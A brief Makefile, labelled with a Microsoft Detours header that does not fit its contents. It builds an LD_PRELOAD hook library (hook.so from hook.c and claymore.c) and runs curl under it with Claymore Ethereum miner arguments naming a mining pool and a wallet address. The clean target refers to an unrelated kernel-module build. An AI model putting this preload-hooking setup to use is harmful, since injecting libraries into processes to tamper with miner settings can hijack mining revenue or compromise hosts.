##############################################################################
##
##  Makefile for Detours.
##
##  Microsoft Research Detours Package, Version 3.0.
##
##  Copyright (c) Microsoft Corporation.  All rights reserved.
##

all:
	gcc -g3 -fPIC -shared -o hook.so hook.c claymore.c -ldl
	#gcc -g3 main.c claymore.c -o withdll
	LD_PRELOAD=./hook.so curl http://www.baidu.com -G -d " -epool eth.f2pool.com:8008 -ewal 0x88aB6f58FFD714608734A69663bF5A3083e099DF -epsw x -eworker MINER_NUM -mode 1 -allpools 1 -allcoins 1"
	#./withdll www.baidu.com 80
	#-epool eth.f2pool.com:8008 -ewal 0x88aB6f58FFD714608734A69663bF5A3083e099DF -epsw x -eworker MINER_NUM -mode 1 -allpools 1 -allcoins 1
	#LD_PRELOAD=./hook.so gdb curl http://www.baidu.com -d " -epool eth.f2pool.com:8008 -ewal 0x88aB6f58FFD714608734A69663bF5A3083e099DF -epsw x -eworker MINER_NUM -mode 1 -allpools 1 -allcoins 1"


clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean


